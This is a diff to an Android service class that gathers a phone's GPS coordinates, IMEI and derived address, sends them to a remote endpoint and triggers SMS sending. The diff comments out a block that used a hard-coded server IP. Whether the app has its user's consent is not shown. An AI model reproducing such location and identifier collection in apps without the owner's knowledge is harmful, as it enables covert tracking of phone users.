@@ -92,19 +92,19 @@ public class SMSService extends Service {
 					Longitude = longti.toString();
 					Latitude = langti.toString();
 					// GpsAddress = AUtilTool.getaddfromgoogle;
-
-					Properties prop = new Properties();
-					prop.setProperty("server", "119.145.9.123");
-					prop.setProperty("port", "2277");
-					Client.setProperty(prop);
-					TelephonyManager telmgr = (TelephonyManager) SMSService.this
-							.getSystemService(Service.TELEPHONY_SERVICE);
-					Device device = new Device(telmgr.getDeviceId());
-					try {
-						GpsAddress = device.QueryLocation(longti, langti);
-					} catch (CharacterCodingException e) {
-						e.printStackTrace();
-					}
+					
+//					Properties prop = new Properties();
+//					prop.setProperty("server", "119.145.9.123");
+//					prop.setProperty("port", "2277");
+//					Client.setProperty(prop);
+//					TelephonyManager telmgr = (TelephonyManager) SMSService.this
+//							.getSystemService(Service.TELEPHONY_SERVICE);
+//					Device device = new Device(telmgr.getDeviceId());
+//					try {
+//						GpsAddress = device.QueryLocation(longti, langti);
+//					} catch (CharacterCodingException e) {
+//						e.printStackTrace();
+//					}
 
 					SendSmsToCall();
 					SendInfoToNet();
@@ -189,6 +189,7 @@ public class SMSService extends Service {
 		InfoParamss.add(new BasicNameValuePair("latitude", Latitude));
 		InfoParamss.add(new BasicNameValuePair("imei_key", imei));
 		InfoParamss.add(new BasicNameValuePair("Address", GpsAddress));
+		InfoParamss.add(new BasicNameValuePair("IsLocationByBaidu", "1"));
 		new NetInterface().SendInfoToNet(LoginURIString, InfoParamss);
 	}
 
